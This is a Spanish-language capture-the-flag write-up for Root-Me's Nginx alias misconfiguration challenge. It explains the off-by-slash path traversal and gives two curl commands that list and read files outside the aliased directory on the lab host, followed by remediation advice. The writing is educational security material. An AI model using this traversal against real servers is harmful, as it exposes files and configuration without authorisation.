# Web - Server — Nginx - Alias Misconfiguration

## Descripción

> **Enunciado oficial:** “Off By Slash”.

- **Categoría:** Web - Server
- **Puntos:** 15
- **Reto:** [Root-Me — Nginx - Alias Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)

La aplicación anuncia que la ruta `/assets/` requiere un parche. Una configuración Nginx con `location /assets` y `alias` terminado en `/` permite escapar del directorio de alias usando `..` inmediatamente después del prefijo.

## Solución

1. Revisar el HTML inicial y observar la pista sobre `/assets/`.
2. Consultar el directorio normal y luego probar el patrón *off-by-slash*:

   ```bash
   curl --path-as-is \
     http://challenge01.root-me.org:59092/assets../
   ```

3. El índice expuesto revela el archivo de validación. Recuperarlo mediante la misma ruta:

   ```bash
   curl --path-as-is \
     http://challenge01.root-me.org:59092/assets../flag.txt
   ```

4. Introducir el resultado solo en Root-Me.

La respuesta fue validada en Root-Me y el «Like» quedó registrado.

## Notas adicionales

- La discrepancia entre una `location` sin `/` final y un `alias` con `/` permite que `../` sea concatenado antes de normalizarse.
- Las rutas de `location` y `alias` deben usar separadores coherentes, y la publicación de directorios debe restringirse.
- La respuesta de validación no se versiona.

## Referencias

- [Reto oficial](https://www.root-me.org/en/Challenges/Web-Server/Nginx-Alias-Misconfiguration)
- [NGINX — alias directive](https://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
